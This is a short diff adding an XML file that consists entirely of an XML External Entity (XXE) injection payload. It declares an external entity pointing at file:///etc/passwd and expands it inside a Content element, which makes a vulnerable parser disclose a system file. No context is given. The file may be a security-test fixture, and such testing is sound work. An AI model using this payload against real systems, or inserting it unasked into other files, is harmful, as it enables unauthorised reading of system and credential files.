@@ -1,0 +1,11 @@
+<!--?xml version="1.0" ?-->
+<!DOCTYPE foo [
+  <!ELEMENT foo ANY>
+  <!ENTITY bar SYSTEM
+  "file:///etc/passwd">
+]>
+<item>
+<Author>data</Author>
+<Subject>data2</Subject>
+<Content>&bar;</Content>
+</item>
